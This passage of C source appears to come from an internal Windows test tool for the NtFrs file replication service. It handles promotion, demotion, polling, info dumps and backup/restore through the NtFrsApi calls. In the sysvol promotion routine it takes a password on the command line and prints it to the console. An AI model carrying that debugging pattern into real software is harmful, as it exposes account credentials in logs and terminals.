                            FORMAT_MESSAGE_ALLOCATE_BUFFER,
                            NULL,
                            WStatus,
                            0,
                            (PWCHAR)&Buffer,
                            0,
                            NULL);
    if (NumChar) {
        fprintf(stderr, "%ws %ws\n", Prefix, Buffer);
    } else {
        fprintf(stderr, "%ws Status %d (0x%08x)\n", Prefix, WStatus, WStatus);
    }
}


VOID
Usage(
    IN DWORD ExitStatus
    )
/*++
Routine Description:
    Print usage and exit

Arguments:
    ExitStatus  - exits with this status

Return Value:
    Exit(ExitStatus)
--*/
{
    printf("frs restore | backup [/all /auth /nonauth /primary /system /ds /normal /key /restart] [dir nonauth|primary|auth ....]\n");
    printf("\t          = excercise the backup/restore api\n");
    printf("\t            WARNING - deletes database\n");
    printf("\trestore   = excercise restore\n");
    printf("\tbackup    = excercise backup\n");
    printf("\t/all      = set all flag (all dirs)\n");
    printf("\t/auth     = set auth flag\n");
    printf("\t/nonauth  = set nonauth flag\n");
    printf("\t/primary  = set primary flag\n");
    printf("\t/system   = set system flag\n");
    printf("\t/ds       = set active directory flag\n");
    printf("\t/normal   = set normal flag\n");
    printf("\t/key      = expect keypath-when-done\n");
    printf("\t/restart  = set restart-service-when-done\n");
    printf("\tSUPPORTED = restore /system /all /nonauth /restart\n");
    printf("\tSUPPORTED = restore /system /all /primary /restart\n");
    printf("\tSUPPORTED = restore /system /all /nonauth /key    \n");
    printf("\tSUPPORTED = restore /system /all /primary /key    \n");
    printf("\tSUPPORTED = restore /ds     /all /nonauth /restart\n");
    printf("\tSUPPORTED = restore /ds     /all /primary /restart\n");
    printf("\tSUPPORTED = restore /ds     /all /nonauth /key    \n");
    printf("\tSUPPORTED = restore /ds     /all /primary /key    \n");
    printf("\tSUPPORTED = restore /ds     /all /nonauth /restart dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds     /all /primary /restart dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds     /all /nonauth /key     dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds     /all /primary /key     dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds          /nonauth /restart dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds          /primary /restart dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds          /nonauth /key     dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /ds          /primary /key     dir primary|nonauth ...\n");
    printf("\tSUPPORTED = restore /normal /all /auth\n");
    printf("\tSUPPORTED = backup /normal\n");
    printf("\n");
    printf("frs install stagepath [targetpath]\n");
    printf("\t          = install the staging file\n");
    printf("\tstagepath = path of staging file.\n");
    printf("\ttargetpath= path of target file to OVERWRITE!.\n");
    printf("\n");
    printf("frs [idtable|inlog|outlog] [computer]\n");
    printf("\t          = enumerate the service's idtable/inlog/outlog \n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs [memory|threads|stage] [computer]\n");
    printf("\t          = list the service's memory usage\n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs ds [computer]\n");
    printf("\t          = list the service's view of the DS\n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs sets [computer]\n");
    printf("\t          = list the active replica sets\n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs version [computer]\n");
    printf("\t          = list the api and service versions\n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs poll [/quickly[=[N]]] [/slowly[=[N]]] [/now] [computer]\n");
    printf("\t          = list the current polling intervals.\n");
    printf("\tnow       = Poll now.\n");
    printf("\tquickly   = Poll quickly until stable configuration retrieved.\n");
    printf("\tquickly=  = Poll quickly every default minutes.\n");
    printf("\tquickly=N = Poll quickly every N minutes.\n");
    printf("\tslowly    = Poll slowly until stable configuration retrieved.\n");
    printf("\tslowly=   = Poll slowly every default minutes.\n");
    printf("\tslowly=N  = Poll slowly every N minutes.\n");
    printf("\tcomputer  = talk to the NtFrs service on this machine.\n");
    printf("\n");
    printf("frs promote Parent Account Password Set Type Primary Stage Root\n");
    printf("\tParent    = RPC bindable name of parent DC.\n");
    printf("\tAccount   = Account on Parent.\n");
    printf("\tPassword  = Password for Account on Parent.\n");
    printf("\tSet       = Name of replica set.\n");
    printf("\tType      = Type of replica set (Enterprise or Domain).\n");
    printf("\tPrimary   = Is this the primary member? (1=yes or 0=no)\n");
    printf("\tStage     = Staging path.\n");
    printf("\tRoot      = Root path.\n");
    printf("\n");
    printf("frs demote Set\n");
    printf("\tSet       = Name of replica set.\n");
    printf("\n");
    printf("frs promotesysvols Parent Account Password PrimaryEnterprise PrimaryDomain Stage RootEnterprise RootDomain\n");
    printf("\tParent    = RPC bindable name of parent DC.\n");
    printf("\tAccount   = Account on Parent.\n");
    printf("\tPassword  = Password for Account on Parent.\n");
    printf("\tPrimaryEnterprise   = Is this the primary member? (1=yes or 0=no)\n");
    printf("\tPrimaryDomain       = Is this the primary member? (1=yes or 0=no)\n");
    printf("\tStage     = Staging path.\n");
    printf("\tRootEnterprise      = Root path.\n");
    printf("\tRootDomain          = Root path.\n");
    printf("\n");
    printf("frs demotesysvols\n");

    exit(ExitStatus);
}


PWCHAR *
ConvertArgv(
    DWORD argc,
    PCHAR *argv
    )
/*++
Routine Description:
    Convert short char argv into wide char argv

Arguments:
    argc    - From main
    argv    - From main

Return Value:
    Address of the new argv
--*/
{
    PWCHAR  *wideargv;

    wideargv = LocalAlloc(LMEM_FIXED, (argc + 1) * sizeof(PWCHAR));
    if (wideargv == NULL) {
        fprintf(stderr, "Can't get memory; Win32 Status %d\n",
                GetLastError());
        exit(1);
    }
    wideargv[argc] = NULL;

    while (argc-- >= 1) {
        wideargv[argc] = LocalAlloc(LMEM_FIXED,
                                    (strlen(argv[argc]) + 1) * sizeof(WCHAR));
        if (wideargv[argc] == NULL) {
            fprintf(stderr, "Can't get memory; Win32 Status %d\n",
                    GetLastError());
            exit(1);
        }
        wsprintf(wideargv[argc], L"%hs", argv[argc]);
        FRS_WCSLWR(wideargv[argc]);
    }
    return wideargv;
}


DWORD
Display(
    IN PWCHAR StrW
    )
/*++
Routine Description:
    Display the string

Arguments:
    StrW

Return Value:
    None.
--*/
{
    printf("DISPLAY %ws\n", StrW);
    return ERROR_SUCCESS;
}


DWORD
FrsErrorCallBack(
    IN PWCHAR   Msg,
    IN DWORD    WStatus
    )
/*++
Routine Description:

Arguments:

Return Value:
--*/
{
    fprintf(stderr, "%ws (%d)\n", Msg, WStatus);
    return ERROR_SUCCESS;
}


VOID
ProcessPromote(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand promote.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Parent;
    PWCHAR  Account;
    PWCHAR  Password;
    PWCHAR  Set;
    PWCHAR  Type;
    PWCHAR  Primary;
    PWCHAR  Stage;
    PWCHAR  Root;
    DWORD   IsPrimary;

    if (argc != 10) {
        Usage(1);
    }

    Parent = Argv[2];
    Account = Argv[3];
    Password = Argv[4];
    Set = Argv[5];
    Type = Argv[6];
    Primary = Argv[7];
    Stage = Argv[8];
    Root = Argv[9];

    //
    // No account; use impersonation
    //
    if (Account && !*Account) {
        Account = NULL;
        Password = NULL;
    }

    printf("%ws %ws %ws ... %ws\n",
           Argv[0], Argv[1], Parent, Root);

    printf("PROMOTE WITH COMMIT\n");

    //
    // Check params
    //
    if (_wcsicmp(Primary, L"0") && _wcsicmp(Primary, L"1")) {
        printf("Primary must be 0 or 1; not %ws\n", Primary);
        Usage(1);
    }
    if (_wcsicmp(Type, NTFRSAPI_REPLICA_SET_TYPE_ENTERPRISE) &&
        _wcsicmp(Type, NTFRSAPI_REPLICA_SET_TYPE_DOMAIN)) {
        printf("Type must be Enterprise or Domain; not %ws\n", Type);
        Usage(1);
    }
    IsPrimary = wcstoul(Primary, NULL, 10);

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForPromotionW( FrsErrorCallBack );
    if (WStatus == ERROR_SUCCESS) {
        printf("success prepare\n");
    } else {
        printf("failure prepare %08x\n", WStatus);
        Win32ToMsg (L"Promote:", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartPromotionW(Parent,
                                       Account,
                                       Password,
                                       Display,
                                       FrsErrorCallBack,
                                       Set,
                                       Type,
                                       IsPrimary,
                                       Stage,
                                       Root);
    if (WStatus == ERROR_SUCCESS) {
        printf("success start\n");
    } else {
        printf("failure start %08x\n", WStatus);
        Win32ToMsg (L"Promote:", WStatus);
    }

    //
    // Wait
    //
    printf("Waiting on promotion\n");
    WStatus = NtFrsApi_WaitForPromotionW(30 * 60 * 1000, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("Wait succeeded\n");
        Win32ToMsg (L"Promote:", WStatus);
    } else {
        printf("failure wait %08x\n", WStatus);
        Win32ToMsg (L"Promote:", WStatus);
    }

    //
    // Commit (or Abort)
    //
    // WStatus = NtFrsApi_AbortPromotionW();
    WStatus = NtFrsApi_CommitPromotionW(0, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success commit\n");
    } else {
        printf("failure commit %08x\n", WStatus);
        Win32ToMsg (L"Promote:", WStatus);
    }
    exit(0);
}


VOID
ProcessPromoteSysVols(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand promotesysvols.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Parent;
    PWCHAR  Account;
    PWCHAR  Password;
    PWCHAR  PrimaryEnterprise;
    PWCHAR  PrimaryDomain;
    PWCHAR  Stage;
    PWCHAR  RootEnterprise;
    PWCHAR  RootDomain;
    DWORD   IsPrimaryEnterprise;
    DWORD   IsPrimaryDomain;
    DWORD   WaitStatus;

    if (argc != 10) {
        Usage(1);
    }

    Parent = Argv[2];
    Account = Argv[3];
    Password = Argv[4];
    PrimaryEnterprise = Argv[5];
    PrimaryDomain = Argv[6];
    Stage = Argv[7];
    RootEnterprise = Argv[8];
    RootDomain = Argv[9];

    printf("%ws %ws %ws %ws %ws %ws %ws %ws %ws %ws\n",
           Argv[0], Argv[1],
           Parent,
           Account,
           Password,
           PrimaryEnterprise,
           PrimaryDomain,
           Stage,
           RootEnterprise,
           RootDomain);

    printf("PROMOTE SYSVOLS WITH COMMIT\n");

    //
    // Check params
    //
    if (_wcsicmp(PrimaryEnterprise, L"0") &&
        _wcsicmp(PrimaryEnterprise, L"1")) {
        printf("Primary Enterprise must be 0 or 1; not %ws\n",
               PrimaryEnterprise);
        Usage(1);
    }
    if (_wcsicmp(PrimaryDomain, L"0") &&
        _wcsicmp(PrimaryDomain, L"1")) {
        printf("Primary Domain must be 0 or 1; not %ws\n",
               PrimaryDomain);
        Usage(1);
    }
    IsPrimaryEnterprise = wcstoul(PrimaryEnterprise, NULL, 10);
    IsPrimaryDomain = wcstoul(PrimaryDomain, NULL, 10);

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForPromotionW(FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success sysvol prepare\n");
    } else {
        printf("ERROR sysvol prepare %d\n", WStatus);
    }

    //
    // Start Enterprise
    //
    WStatus = NtFrsApi_StartPromotionW(Parent,
                                       Account,
                                       Password,
                                       Display,
                                       FrsErrorCallBack,
                                       NTFRSAPI_REPLICA_SET_TYPE_ENTERPRISE,
                                       NTFRSAPI_REPLICA_SET_TYPE_ENTERPRISE,
                                       IsPrimaryEnterprise,
                                       Stage,
                                       RootEnterprise);
    if (WStatus == ERROR_SUCCESS) {
        printf("success sysvol enterprise start\n");
    } else {
        printf("ERROR sysvol enterprise start %d\n", WStatus);
    }

    //
    // Start Domain
    //
    WStatus = NtFrsApi_StartPromotionW(Parent,
                                       Account,
                                       Password,
                                       Display,
                                       FrsErrorCallBack,
                                       NTFRSAPI_REPLICA_SET_TYPE_DOMAIN,
                                       NTFRSAPI_REPLICA_SET_TYPE_DOMAIN,
                                       IsPrimaryDomain,
                                       Stage,
                                       RootDomain);
    if (WStatus == ERROR_SUCCESS) {
        printf("success sysvol domain start\n");
    } else {
        printf("ERROR sysvol domain start %d\n", WStatus);
    }

    //
    // Wait
    //
    printf("Waiting on promotion\n");
    WaitStatus = NtFrsApi_WaitForPromotionW(5 * 60 * 1000,FrsErrorCallBack);
    if (WaitStatus == WAIT_TIMEOUT) {
        printf("Wait timed out\n");
    } else if (WaitStatus == WAIT_FAILED) {
            WStatus = GetLastError();
            printf("ERROR wait sysvols %d\n", WStatus);
    } else {
        printf("Wait sysvols succeeded\n");
    }

    //
    // Commit (or Abort)
    //
    // WStatus = NtFrsApi_AbortPromotionW();
    WStatus = NtFrsApi_CommitPromotionW(0,FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success sysvols commit\n");
    } else {
        printf("ERROR sysvols commit %d\n", WStatus);
    }
    exit(0);
}


VOID
ProcessPromoteAbort(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand promoteabort.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Parent;
    PWCHAR  Account;
    PWCHAR  Password;
    PWCHAR  Set;
    PWCHAR  Type;
    PWCHAR  Primary;
    PWCHAR  Stage;
    PWCHAR  Root;
    DWORD   IsPrimary;
    DWORD   WaitStatus;

    if (argc != 10) {
        Usage(1);
    }

    Parent = Argv[2];
    Account = Argv[3];
    Password = Argv[4];
    Set = Argv[5];
    Type = Argv[6];
    Primary = Argv[7];
    Stage = Argv[8];
    Root = Argv[9];

    printf("%ws %ws %ws ... %ws\n",
           Argv[0], Argv[1], Parent, Root);

    printf("PROMOTE WITH ABORT\n");

    //
    // Check params
    //
    if (_wcsicmp(Primary, L"0") && _wcsicmp(Primary, L"1")) {
        printf("Primary must be 0 or 1; not %ws\n", Primary);
        Usage(1);
    }
    if (_wcsicmp(Type, NTFRSAPI_REPLICA_SET_TYPE_ENTERPRISE) &&
        _wcsicmp(Type, NTFRSAPI_REPLICA_SET_TYPE_DOMAIN)) {
        printf("Type must be Enterprise or Domain; not %ws\n", Type);
        Usage(1);
    }
    IsPrimary = wcstoul(Primary, NULL, 10);

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForPromotionW(FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success prepare\n");
    } else {
        printf("failure prepare %d\n", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartPromotionW(Parent,
                                       Account,
                                       Password,
                                       NULL,
                                       FrsErrorCallBack,
                                       Set,
                                       Type,
                                       IsPrimary,
                                       Stage,
                                       Root);
    if (WStatus == ERROR_SUCCESS) {
        printf("success start\n");
    } else {
        printf("failure start %d\n", WStatus);
    }

    //
    // Abort
    //
    WStatus = NtFrsApi_AbortPromotionW();
    if (WStatus == ERROR_SUCCESS) {
        printf("success abort\n");
    } else {
        printf("failure abort %d\n", WStatus);
    }
    exit(0);
}


VOID
ProcessDemote(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand demote.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Set;
    DWORD   WaitStatus;

    if (argc != 3) {
        Usage(1);
    }

    Set = Argv[2];
    printf("%ws %ws %ws\n", Argv[0], Argv[1], Set);

    printf("***** DEMOTE WITH COMMIT\n");

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForDemotionW(FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote prepare\n");
    } else {
        printf("failure demote prepare %d\n", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartDemotionW(Set,FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote start\n");
    } else {
        printf("failure demote start %d\n", WStatus);
    }

    //
    // Wait
    //
    WStatus = NtFrsApi_WaitForDemotionW(5 * 60 * 1000,FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote wait\n");
    } else {
        printf("failure demote wait %d\n", WStatus);
    }
    //
    // Wait
    //
    printf("Waiting on demotion\n");
    WaitStatus = NtFrsApi_WaitForPromotionW(5 * 60 * 1000,FrsErrorCallBack);
    if (WaitStatus == WAIT_TIMEOUT) {
        printf("Wait timed out\n");
    } else if (WaitStatus == WAIT_FAILED) {
            WStatus = GetLastError();
            printf("failure wait %d\n", WStatus);
    } else {
            printf("Wait succeeded\n");
    }

    //
    // Commit (or Abort)
    //
    WStatus = NtFrsApi_CommitDemotionW(0,FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote commit\n");
    } else {
        printf("failure demote commit %d\n", WStatus);
    }
    exit(0);
}


VOID
ProcessDemoteSysVols(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand demotesysvols.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    DWORD   WaitStatus;

    if (argc != 2) {
        Usage(1);
    }

    printf("%ws %ws\n", Argv[0], Argv[1]);

    printf("***** DEMOTE SYSVOLS WITH COMMIT\n");

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForDemotionW(FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote sysvols prepare\n");
    } else {
        printf("ERROR demote sysvols prepare %d\n", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartDemotionW(NTFRSAPI_REPLICA_SET_TYPE_ENTERPRISE,NULL);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote enterprise start\n");
    } else {
        printf("ERROR demote enterprise start %d\n", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartDemotionW(NTFRSAPI_REPLICA_SET_TYPE_DOMAIN, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote domain start\n");
    } else {
        printf("ERROR demote domain start %d\n", WStatus);
    }

    //
    // Wait
    //
    WStatus = NtFrsApi_WaitForDemotionW(5 * 60 * 1000, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote sysvols wait\n");
    } else {
        printf("ERROR demote sysvols wait %d\n", WStatus);
    }
    //
    // Wait
    //
    printf("Waiting on demotion\n");
    WaitStatus = NtFrsApi_WaitForPromotionW(5 * 60 * 1000, FrsErrorCallBack);
    if (WaitStatus == WAIT_TIMEOUT) {
        printf("Wait timed out\n");
    } else if (WaitStatus == WAIT_FAILED) {
            WStatus = GetLastError();
            printf("ERROR wait %d\n", WStatus);
    } else {
            printf("Wait demote sysvols succeeded\n");
    }

    //
    // Commit (or Abort)
    //
    WStatus = NtFrsApi_CommitDemotionW(0, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote sysvols commit\n");
    } else {
        printf("ERROR demote sysvols commit %d\n", WStatus);
    }
    exit(0);
}


VOID
ProcessDemoteAbort(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand demoteabort.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Set;
    DWORD   WaitStatus;

    if (argc != 3) {
        Usage(1);
    }

    Set = Argv[2];
    printf("%ws %ws %ws\n", Argv[0], Argv[1], Set);

    printf("***** DEMOTE WITH ABORT\n");

    //
    // Prepare
    //
    WStatus = NtFrsApi_PrepareForDemotionW(FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote prepare\n");
    } else {
        printf("failure demote prepare %d\n", WStatus);
    }

    //
    // Start
    //
    WStatus = NtFrsApi_StartDemotionW(Set, FrsErrorCallBack);
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote start\n");
    } else {
        printf("failure demote start %d\n", WStatus);
    }

    //
    // Abort
    //
    WStatus = NtFrsApi_AbortDemotionW();
    if (WStatus == ERROR_SUCCESS) {
        printf("success demote abort\n");
    } else {
        printf("failure demote abort %d\n", WStatus);
    }
    exit(0);
}


VOID
ProcessPoll(
    IN DWORD argc,
    IN PWCHAR *Argv
    )
/*++
Routine Description:
    Process the command line for the subcommand poll.

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    DWORD   i;
    ULONG   LongInterval;
    ULONG   ShortInterval;
    ULONG   UseShortInterval;
    ULONG   Interval;
    DWORD   ComputerLen;
    PWCHAR  ComputerName;
    BOOL    SetInterval;

    //
    // Initialize the input parameters
    //
    LongInterval = 0;
    ShortInterval = 0;
    UseShortInterval = 0;
    ComputerName = NULL;
    SetInterval = FALSE;

    for (i = 2; i < argc; ++i) {
        //
        // Process options for poll
        //

        //
        // Not a parameter; must be the computer name
        //
        if (*Argv[i] != L'/' && *Argv[i] != L'-') {
            if (ComputerName) {
                fprintf(stderr, "Multiple computer names are not allowed\n");
                Usage(1);
            }
            ComputerName = Argv[i];
        //
        // /?
        //
        } else if (wcsstr(Argv[i] + 1, L"?") == Argv[i] + 1) {
            Usage(0);
        //
        // /quickly
        //
        } else if (!_wcsnicmp(Argv[i], L"/quickly", 8)) {
            SetInterval = TRUE;
            UseShortInterval = 1;
            if (*(Argv[i] + 8) != L'\0') {
                if (*(Argv[i] + 8) != L'=') {
                    fprintf(stderr, "Don't understand %ws\n", Argv[i]);
                    Usage(1);
                }
                if (*(Argv[i] + 9) == L'\0') {
                    ShortInterval = NTFRSAPI_DEFAULT_SHORT_INTERVAL;
                } else {
                    ShortInterval = wcstoul(Argv[i] + 9, NULL, 10);
                }
                if (ShortInterval < NTFRSAPI_MIN_INTERVAL ||
                    ShortInterval > NTFRSAPI_MAX_INTERVAL) {
                    fprintf(stderr, "Interval must be between %d and %d\n",
                            NTFRSAPI_MIN_INTERVAL, NTFRSAPI_MAX_INTERVAL);
                    Usage(1);
                }
            }
        //
        // /slowly
        //
        } else if (!_wcsnicmp(Argv[i], L"/slowly", 7)) {
            SetInterval = TRUE;
            if (*(Argv[i] + 7) != L'\0') {
                if (*(Argv[i] + 7) != L'=') {
                    fprintf(stderr, "Don't understand %ws\n", Argv[i]);
                    Usage(1);
                }
                if (*(Argv[i] + 8) == L'\0') {
                    LongInterval = NTFRSAPI_DEFAULT_LONG_INTERVAL;
                } else {
                    LongInterval = wcstoul(Argv[i] + 8, NULL, 10);
                }
                if (LongInterval < NTFRSAPI_MIN_INTERVAL ||
                    LongInterval > NTFRSAPI_MAX_INTERVAL) {
                    fprintf(stderr, "Interval must be between %d and %d\n",
                            NTFRSAPI_MIN_INTERVAL, NTFRSAPI_MAX_INTERVAL);
                    Usage(1);
                }
            }
        //
        // /now
        //
        } else if (!_wcsnicmp(Argv[i], L"/now", 4)) {
            SetInterval = TRUE;
            if (*(Argv[i] + 4) != L'\0') {
                fprintf(stderr, "Don't understand %ws\n", Argv[i]);
                Usage(1);
            }
        //
        // Don't understand
        //
        } else {
            fprintf(stderr, "Don't understand %ws\n", Argv[i]);
            Usage(1);
        }
    }
    if (SetInterval) {
        //
        // Set the interval and initiate a new polling cycle
        //
        WStatus = NtFrsApi_Set_DsPollingIntervalW(ComputerName,
                                                  UseShortInterval,
                                                  LongInterval,
                                                  ShortInterval);
        if (!WIN_SUCCESS(WStatus)) {
            Win32ToMsg(L"Can't set interval:", WStatus);
            exit(1);
        }
    } else {
        //
        // Get the current polling cycles
        //
        WStatus = NtFrsApi_Get_DsPollingIntervalW(ComputerName,
                                                  &Interval,
                                                  &LongInterval,
                                                  &ShortInterval);
        if (!WIN_SUCCESS(WStatus)) {
            Win32ToMsg(L"Can't get intervals:", WStatus);
            exit(1);
        }
        printf("Current Interval: %6d minutes\n", Interval);
        printf("Short Interval  : %6d minutes\n", ShortInterval);
        printf("Long Interval   : %6d minutes\n", LongInterval);
    }
    exit(0);
}


VOID
ProcessDump(
    IN DWORD    argc,
    IN PWCHAR   *Argv,
    IN DWORD    TypeOfInformation
    )
/*++
Routine Description:
    Dump bunches of stuff

Arguments:
    argc
    Argv
    TypeOfInformation

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PCHAR   Line;
    BOOL    FirstTime = TRUE;
    PVOID   Info = NULL;
    PWCHAR  ComputerName = NULL;

    if (argc > 2) {
        ComputerName = Argv[2];
    }

    do {
        WStatus = NtFrsApi_InfoW(ComputerName,
                                 TypeOfInformation,
                                 0,
                                 &Info);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr, "ERROR NtFrsApi_InfoW() Error %d\n", WStatus);
            NtFrsApi_InfoFreeW(&Info);
            exit(1);
        }
        if (Info) {
            if (!FirstTime) {
                printf("===== THE FOLLOWING INFO MAY BE INCONSISTENT DUE TO REFETCH =====\n");
            }
            FirstTime = FALSE;

            Line = NULL;
            do {
                WStatus = NtFrsApi_InfoLineW(Info, &Line);
                if (!WIN_SUCCESS(WStatus)) {
                    fprintf(stderr, "ERROR NtFrsApi_InfoLineW() Error %d\n", WStatus);
                    NtFrsApi_InfoFreeW(&Info);
                    exit(1);
                }
                if (Line) {
                    printf("%s", Line);
                }
            } while (Line);
        }
    } while (Info);
    exit(0);
}


typedef struct _DIRS DIRS, *PDIRS;
struct _DIRS {
    PDIRS   Next;
    PWCHAR  Dir;
    PVOID   BurSet;
};
VOID
ProcessBackupRestore(
    IN DWORD    argc,
    IN PWCHAR   *Argv,
    IN DWORD    BurFlags
    )
/*++
Routine Description:
    Dump replicated dirs

Arguments:
    argc
    Argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    DWORD   i;
    DWORD   BurSetIndex;
    DWORD   DestroyBurFlags = NTFRSAPI_BUR_FLAGS_NONE;
    PVOID   BurContext;
    PVOID   BurSet;
    BOOL    IsSysvol;
    BOOL    ExpectKey = FALSE;
    BOOL    Spin = FALSE;
    HKEY    HKey;
    PWCHAR  DirPath;
    PWCHAR  DirType;
    PDIRS   Dirs = NULL;
    PDIRS   Dir = NULL;
    DWORD   BufferSize;
    WCHAR   Buffer[1024];
    DWORD   Buffer2Size;
    WCHAR   Buffer2[1024];
    DWORD   FiltersSize;
    WCHAR   Filters[1024];
    PWCHAR  Str;

    for (i = 2; i < argc; ++i) {
        printf("%ws\n", Argv[i]);
        if (!_wcsicmp(Argv[i], L"/auth")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_AUTHORITATIVE;
        } else if (!_wcsicmp(Argv[i], L"/nonauth")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_NON_AUTHORITATIVE;
        } else if (!_wcsicmp(Argv[i], L"/primary")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_PRIMARY;
        } else if (!_wcsicmp(Argv[i], L"/system")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_SYSTEM;
        } else if (!_wcsicmp(Argv[i], L"/ds")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_ACTIVE_DIRECTORY;
        } else if (!_wcsicmp(Argv[i], L"/normal")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_NORMAL;
        } else if (!_wcsicmp(Argv[i], L"/all")) {
            BurFlags |= NTFRSAPI_BUR_FLAGS_ALL_DIRECTORIES_AND_VOLUMES;
        } else if (!_wcsicmp(Argv[i], L"/restart")) {
            DestroyBurFlags |= NTFRSAPI_BUR_FLAGS_RESTART;
        } else if (!_wcsicmp(Argv[i], L"/unknown")) {
            BurFlags |= 0x80000000;
        } else if (!_wcsicmp(Argv[i], L"/destroyunknown")) {
            DestroyBurFlags |= 0x80000000;
        } else if (!_wcsicmp(Argv[i], L"/key")) {
            ExpectKey = TRUE;
        } else if (!_wcsicmp(Argv[i], L"/spin")) {
            Spin = TRUE;
        } else if (*Argv[i] == L'/') {
            fprintf(stderr, "Don't understand %ws\n", Argv[i]);
            exit(1);
        }
    }
SPIN_ON_INITIALIZE:
    WStatus = NtFrsApiInitializeBackupRestore(FrsErrorCallBack,
                                              BurFlags,
                                              &BurContext);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr,
                "ERROR NtFrsApiInitializeBackupRestore(%08x) Error %d\n",
                BurFlags,
                WStatus);
        if (Spin) {
            Sleep(2 * 1000);
            goto SPIN_ON_INITIALIZE;
        }
        exit(1);
    }
    WStatus = NtFrsApiGetBackupRestoreSets(BurContext);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr,
                "WARN NtFrsApiGetBackupRestoreSets() Error %d\n",
                WStatus);
        goto DESTROY;
    }
    BurSetIndex = 0;
    while (TRUE) {
        WStatus = NtFrsApiEnumBackupRestoreSets(BurContext,
                                                BurSetIndex,
                                                &BurSet);
        if (!WIN_SUCCESS(WStatus)) {
            break;
        }
        WStatus = NtFrsApiIsBackupRestoreSetASysvol(BurContext,
                                                    BurSet,
                                                    &IsSysvol);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr,
                    "ERROR NtFrsApiIsBackupRestoreSetASysvol(%d) Error %d\n",
                    BurSetIndex,
                    WStatus);
            goto DESTROY;
        }
        //
        // Directory
        //
        BufferSize = 1;
        WStatus = NtFrsApiGetBackupRestoreSetDirectory(BurContext,
                                                       BurSet,
                                                       &BufferSize,
                                                       Buffer);
